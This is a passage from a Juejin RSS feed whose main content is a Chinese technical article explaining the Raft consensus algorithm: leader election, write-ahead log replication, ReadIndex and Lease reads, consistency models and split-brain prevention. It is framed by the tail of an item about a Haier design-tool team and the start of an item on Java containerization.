<p>「<strong>三翼鸟数字化技术平台-应用软件框架开发</strong>」主要负责设计工具的研发，包括营销设计工具、家电VR设计和展示、水电暖通前置设计能力，研发并沉淀素材库，构建家居家装素材库，集成户型库、全品类产品库、设计方案库、生产工艺模型，打造基于户型和风格的AI设计能力，快速生成算量和报价；同时研发了门店设计师中心和项目中心，包括设计师管理能力和项目经理管理能力。实现了场景全生命周期管理，同时为水，空气，厨房等产业提供商机管理工具，从而实现了以场景贯穿的B端C端全流程系统。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[深入理解分布式共识算法 Raft]]></title>    <link>https://juejin.cn/post/7576994308273750035</link>    <guid>https://juejin.cn/post/7576994308273750035</guid>    <pubDate>2025-11-27T06:41:07.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7576994308273750035" data-draft-id="7577171133444407332" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="深入理解分布式共识算法 Raft"/> <meta itemprop="keywords" content="程序员"/> <meta itemprop="datePublished" content="2025-11-27T06:41:07.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="京东云开发者"/> <meta itemprop="url" content="https://juejin.cn/user/2634854380340008"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            深入理解分布式共识算法 Raft
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2634854380340008/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    京东云开发者
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-27T06:41:07.000Z" title="Thu Nov 27 2025 06:41:07 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-27
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读11分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>“不可靠的网络”、“不稳定的时钟”和“节点的故障”都是在分布式系统中常见的问题，在文章开始前，我们先来看一下：如果在分布式系统中网络不可靠会发生什么样的问题。</p>
<p>有以下 3 个服务构成的分布式集群，并在 server_1 中发生写请求变更 A = 1，“正常情况下” server_1 将 A 值同步给 server_2 和 server_3，保证集群的数据一致性：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/72ef24adcba943aaaccd990a108b64ca~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lqs5Lic5LqR5byA5Y-R6ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764830467&amp;x-signature=c1zBqbb5Qu8GoHfSX6CFbZDgjqI%3D" alt="raft.png" loading="lazy"/></p>
<p>但是如果在数据变更时发生网络问题（延迟、断连和丢包等）便会出现以下情况：比如有两个写操作同时发生在 server_1 或 server_3 上，即便两个写操作有先后顺序，但可能由于网络延时导致各个服务中数据的不一致：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4927d1eff0d64b46893aebc585a4a263~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lqs5Lic5LqR5byA5Y-R6ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764830467&amp;x-signature=FAOUIJGWGdF11eqV87Z5W11jVRw%3D" alt="raft2.png" loading="lazy"/></p>
<p>同样地情况，如果在 server_1 上发生三次写操作，在数据同步的过程中因为网络延时或网络丢包也可能会导致数据的不一致：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/dc47590acd0c4e13bc23863c33ae3012~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lqs5Lic5LqR5byA5Y-R6ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764830467&amp;x-signature=Vy3Y40uwIsCvr6PVDBwpHaAJwzY%3D" alt="raft3.png" loading="lazy"/></p>
<p>那么为了避免以上这些集群间数据不一致的问题，便需要分布式共识算法来协调。分布式共识算法简单来说就是如何在多个服务器间对某一个值达成一致，并且当达成一致之后，无论之后这些机器间发生怎样的故障，这个值能保持不变。本篇文章我们便对 Raft 算法进行介绍。</p>
<h3 data-id="heading-0">理解 Raft 算法</h3>
<p>了解和学习过 Zookeeper 的同学可能听说过 Zab 算法，它用来保证 Zookeeper 中数据的 <strong>顺序一致性</strong>。Raft 也是一种分布式共识算法，它易于理解和实现，用于保证数据的 <strong>线性一致性</strong>，是最强一致性模型。</p>
<p>在遵循 Raft 算法的集群中，节点会有 3 种不同的角色。当集群在初始化时，每个节点的角色都是 Follower 跟随者，它们会等待来自 Leader 节点的心跳。因为此时并没有 Leader 节点，所以会等待心跳超时。等待超时的 Follower 节点会将角色转变为 Candidate 候选者，触发一次选举，触发选举时会标记 Term 任期变量，并将自己的一票投给自己，通知其他 Follower 节点发起投票。经过投票后，收到超过半数节点票数的 Candidate 节点会成为 Leader 领导者节点，其他节点为 Follower 跟随者节点，Leader 节点会不断地发送心跳给 Follower 节点来维持领导地位：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/274fc222277b481b8638036b23b3247e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lqs5Lic5LqR5byA5Y-R6ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764830467&amp;x-signature=qBpByv5ZaL6%2BioiUDvxXQ6k6WJk%3D" alt="raft4.png" loading="lazy"/></p>
<p>如果每个节点每次在触发选举时都是同时超时，这样是不是导致不能完成一次选举，产生 <strong>“活锁”</strong> 问题？的确可能，不过活锁问题也很好解决：即节点超时时间在合理的范围内取随机值，这样由于它的随机性就不太可能再同时发起竞选了，这个时候其他节点便有足够的时间向其他节点索要选票。</p>
<h4 data-id="heading-1">写变更请求</h4>
<p>当发生写变更请求时，由 Leader 节点负责处理，即使是请求到 Follower 节点，也需要转发给 Leader 节点处理。当 Leader 节点接收到写请求时，它并不立即对这个请求进行处理，而是先将请求信息 <strong>按顺序追加到日志文件中（WAL: write-ahead-log）</strong> ，如图中标记的 log_index 表示追加到的最新一条日志的序号：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e25aeb79af6a474c8cc608b589f54d44~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lqs5Lic5LqR5byA5Y-R6ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764830467&amp;x-signature=2z0yHUkAG5qMrK%2FElbUdX0ODuDA%3D" alt="raft5.png" loading="lazy"/></p>
<p>在这个过程中，<strong>日志必须持久化存储</strong>。随后，Leader 节点通过 RPC 请求将日志同步到各个 Follower 节点，当超过半数节点成功将日志记录时，便认为同步成功。在这里可知 Raft 算法采用的是单主复制的模型，所以它也就会存在以下缺点：</p>
<ol>
<li>面对大量写请求负载时系统比较难扩展，因为系统只有一个主节点，写请求的性能瓶颈由单个节点决定</li>
<li>当主节点宕机时，从节点提升为主节点不是即时的，可能会造成一些停机时间</li>
</ol>
<p>随后，Leader 节点会更新最新同步日志的索引 commit_index 为 1，并通过心跳下发给各个 Follower 节点：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d117c20fda3e4489b545e3e5e3d29564~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lqs5Lic5LqR5byA5Y-R6ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764830467&amp;x-signature=wHdsbKuMwEvEPqFnFFiiL2IHmbU%3D" alt="raft6.png" loading="lazy"/></p>
<p>在这个过程中可以发现 Follower 节点只是听从并响应 Leader 节点，没有任何主动性。现在，已经完成了日志在集群间的同步，但是请求对变量 A 的修改还没有被应用（Apply）。Apply 是在 Raft 算法中经常出现的一个名词，在多数与 Raft 算法相关的文章中经常会看到 “将已提交的日志条目应用到状态机” 等类似的表述。其实 “状态机” 理解起来并不复杂，通俗的理解是 <strong>业务逻辑的载体</strong> 或 <strong>业务逻辑的执行者</strong>，它的职责包括：</p>
<ol>
<li>接收来自日志文件中有序的命令</li>
<li>执行具体的业务逻辑，在本次写请求中，业务逻辑指的便是变更 A 的值</li>
<li>变更应用程序的状态</li>
<li>返回执行结果</li>
</ol>
<p>更加通俗的讲就是 <strong>让请求生效</strong>。将已经提交的日志应用到状态机是比较简单且自主的过程，各个服务实例会记录 apply_index 来标记应用索引，当 apply_index 小于 commit_index 时，那么证明日志文件中记录的请求信息还有部分没生效，所以需要按顺序应用，直到 apply_index = commit_index：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c6c57c3e3ca0412f972fd8398b39ca75~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lqs5Lic5LqR5byA5Y-R6ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764830467&amp;x-signature=EitVlb7xVG7zMe73Pf%2Fbt90cgls%3D" alt="raft7.png" loading="lazy"/></p>
<p>在这个过程中，我一直在强调 <strong>“按顺序”</strong> ，不论是日志的追加还是日志的被应用都是按顺序来的，因此才能保证数据的线性一致性。</p>
<h4 data-id="heading-2">读请求</h4>
<p>Raft 集群处理读请求会保证读请求的线性一致性，所谓线性一致性读就是在 t1 的时间写入了一个值，那么在 t1 之后，读一定能读到这个值，不可能读到 t1 之前的值，在 Raft 算法中实现线性一致性读有以下两种方式：</p>
<h5 data-id="heading-3">ReadIndex Read</h5>
<p>在这种方式下，当 Leader 节点处理读请求时：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5d886b67e1664b74912b09ef50d9131b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lqs5Lic5LqR5byA5Y-R6ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764830467&amp;x-signature=LXi6G8oL5kX8R0CrENTqgBIqPcE%3D" alt="raft10.png" loading="lazy"/></p>
<ol>
<li>首先将 commit_index 记录到本地的 read_index 变量里</li>
<li>向其他节点发送一次 Heartbeat，确认自己仍然是 Leader 角色</li>
<li>Leader 节点等待自己的状态机执行，直到 apply_index 超过了 read_index，这样就能够安全的提供线性一致性读了</li>
<li>Leader 执行 read 请求，将结果返回</li>
</ol>
<p>在第三步中，保证 <code>apply_index &gt;= read_index</code> 是为了保证所有小于等于 <code>read_index</code> 的请求都已经生效。</p>
<p>如果是 Follower 节点处理读请求也和以上过程类似，当 Follower 节点收到读请求后，直接给 Leader 发送一个获取此时 read_index 的请求，Leader 节点仍然处理以上流程然后将 read_index 返回，此时 Follower 节点等到当前的状态机 apply_index 超过 read_index 后，就可以返回结果了。</p>
<h5 data-id="heading-4">Lease Read</h5>
<p>因为 ReadIndex Read 需要发送一次 Heartbeat 来确认 Leader 身份，存在 RPC 请求的开销，为了进一步优化，便可以采用租约（Lease）读。租约其实指的是 Leader 节点身份的过期约定时间，所以这种读请求只针对 Leader 节点，Follower 节点没有租约的概念，它通过以下公式计算：</p>
<p><code>lease_end = current_time() + election_timeout / clock_drift_bound</code></p>
<p>其中 election_timeout 为选举的超时时间，clock_drift_bound 表示时钟漂移，指的是在分布式系统中，两个或多个节点上的时钟以不同的速率运行，导致它们之间的时间差随时间不断累积和变化（也就是分布式系统中不稳定的时钟问题）。</p>
<p>举个简单的例子，假如选举过期时间是 10s，时钟漂移为 1.1，那么租约过期时间为：lease_end = current_time() + 10s / 1.1 ≈ current_time() + 9s，如果在处理读请求时，在租约时间内，则无需发送 Heartbeat 来明确 Leader 身份，直接等待 apply_index &gt;= commit_index 后返回请求结果。</p>
<hr/>
<p>在以上读写流程中，Raft 分布式共识算法能让每个节点对日志的值和顺序达成共识，每个节点都存储相同的日志副本，使整个系统中的每个节点都能有一致的状态和输出，使得这些节点看起来就像一个单独的，高可用的状态机。在上文中我们提到过 Zookeeper 使用的 Zab 共识算法保证的是顺序一致性，Raft 算法保证的是线性一致性，所以借着这个引子也来谈谈我对一致性的理解。</p>
<h4 data-id="heading-5">一致性</h4>
<p><strong>一致性</strong> 通常指的就是数据一致性，在分布式系统中的读写请求，表现得像在单机系统上一样，符合直觉和预期。一致性模型有很多种，在这里我们只谈以下常见的几种：</p>
<p><strong>线性一致性</strong> 是最强的一致性模型，也被称为强一致性，在 CAP 定理中的 C 表达的一致性含义便是线性一致性。这种一致性模型要求系统要像单一节点一样工作，并且所有操作是原子的，它有两个约束条件：</p>
<ol>
<li>顺序记录中的任何一次读必须读到最近一次写入的数据</li>
<li>顺序记录要跟全局时钟下的顺序保持一致</li>
</ol>
<p><strong>顺序一致性</strong> 要比线性一致性弱，它只要求 <strong>同一客户端或进程的操作在排序后保持先后顺序不变</strong>，但 <strong>不同客户端之间的先后顺序是可以任意改变的</strong>，顺序一致性与线性一致性的主要区别在于 <strong>没有全局时间的限制</strong>。比如在社交网络场景下，一个人通常不关注他看到的所有朋友的帖子的顺序，但是对于某个具体朋友，仍然以正确的顺序显示帖子的顺序。</p>
<p><strong>因果一致性</strong> 则是比 <strong>顺序一致性</strong> 更弱的一致性模型，因果一致性要求必须以相同的顺序看到因果相关的操作，而没有因果关系的并发操作可以被不同的进程以不同的顺序观察到。典型的例子就是社交网络中发帖和评论的关系：必须先有发帖才能对该帖子进行评论，所以发帖操作必须在评论操作之前。</p>
<p><strong>最终一致性</strong> 是常见的最弱的一致性模型，所谓最终表达的含义是“对于系统到达稳定状态并没有硬性要求”，即便这听起来很不靠谱，但是在业务中被应用的很多也很好，而且这种一致性模型能使系统的性能很高。</p>
<blockquote>
<p>CAP 定理：C 代表一致性，当客户端访问所有节点时，返回的都是同一份最新的数据；A 代表可用性，指每次请求都能获取到非错误的响应，但不保证获取的数据是最新的；P 代表分区容错性，节点之间由于网络分区而导致消息丢失的情况下，系统仍能正常运行。</p>
</blockquote>
<p>接下来我们再来谈谈脑裂问题：</p>
<h4 data-id="heading-6">脑裂问题</h4>
<p>当集群中发生网络通讯问题时，读、写请求只能在超过半数节点的集群内生效，<strong>过半数机制</strong> 在数学上保证不可能同时存在两个Leader：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a27055a414e34de49f3535ab5edc3ec7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lqs5Lic5LqR5byA5Y-R6ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764830467&amp;x-signature=%2B0Ad4lhy3HDsuULhvxDt3rNEVzc%3D" alt="raft8.png" loading="lazy"/></p>
<p>除此之外还有以下机制来避免脑裂问题：</p>
<ol>
<li><strong>Term机制</strong>：时间上保证旧Leader会自动让位给新Leader</li>
<li><strong>主动stepDown</strong>：Leader无法联系到过半数节点时主动放弃领导权</li>
<li><strong>严格的投票规则</strong>：每个term每个节点只能投票给一个候选人</li>
</ol>
<p>当网络问题恢复时，Follower 节点能通过 Leader 节点的日志同步重新追回期间错过的数据。此外，一般采用 Raft 算法的集群在部署的时都是 <strong>“奇数个节点”</strong> ，而不是偶数个节点，这其实是数学的体现，性价比更高：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b5d270d692d348a583b159e1155f515e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lqs5Lic5LqR5byA5Y-R6ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764830467&amp;x-signature=qBmGaB5xSdBKiP6MRSjseeMz8Bs%3D" alt="raft9.png" loading="lazy"/></p>
<p>如上图所示，虽然部署 4 个节点多出一个节点，但是和 3 节点集群相比，容错能力是相同的：只能容忍 1 个节点故障。在容错能力没有被提高的情况下又花费了更多的服务器成本和运维管理成本。</p>
<hr/>
<p>以上我们基本了解了 Raft 算法的内容，如果想使用 Raft 算法，对系统模型有以下要求：</p>
<ol>
<li>服务可能宕机、停止运行，但过段时间能够恢复，但不能存在 <strong>拜占庭故障</strong></li>
<li>消息可能丢失、延迟乱序或重复；可能有网络分区，并在一段时间之后恢复</li>
</ol>
<hr/>
<h3 data-id="heading-7">巨人的肩膀</h3>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.sofastack.tech%2Fprojects%2Fsofa-jraft%2Foverview%2F" target="_blank" title="https://www.sofastack.tech/projects/sofa-jraft/overview/" ref="nofollow noopener noreferrer">SOFAJRaft</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fraft.github.io%2F" target="_blank" title="https://raft.github.io/" ref="nofollow noopener noreferrer">The Raft Consensus Algorithm</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fcn.pingcap.com%2Fblog%2Flease-read%2F" target="_blank" title="https://cn.pingcap.com/blog/lease-read/" ref="nofollow noopener noreferrer">TiKV 功能介绍 – Lease Read</a></li>
<li>《深入理解分布式系统》</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Java 应用容器化与部署]]></title>    <link>https://juejin.cn/post/7577189654487990322</link>    <guid>https://juejin.cn/post/7577189654487990322</guid>    <pubDate>2025-11-27T06:49:33.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7577189654487990322" data-draft-id="7576978338754854962" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Java 应用容器化与部署"/> <meta itemprop="keywords" content="Java"/> <meta itemprop="datePublished" content="2025-11-27T06:49:33.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="信码由缰"/> <meta itemprop="url" content="https://juejin.cn/user/2110664941509214"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Java 应用容器化与部署
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2110664941509214/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    信码由缰
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-27T06:49:33.000Z" title="Thu Nov 27 2025 06:49:33 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-27
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读14分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag 